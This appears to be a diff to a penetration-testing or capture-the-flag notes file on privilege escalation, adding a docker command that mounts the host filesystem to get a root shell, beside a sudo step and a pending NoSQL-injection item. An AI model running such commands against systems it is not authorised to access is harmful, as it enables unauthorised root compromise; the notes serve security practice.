@@ -11,6 +11,8 @@
 
 Execute it: `sudo -u deploy /home/deploy/password-manager` to have deploy's privileges
 
+* If any user has docker acces, try `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`as said in Gtfobins to obtain a root shell
+
 #### Pending tasks
 
 * Nosqli
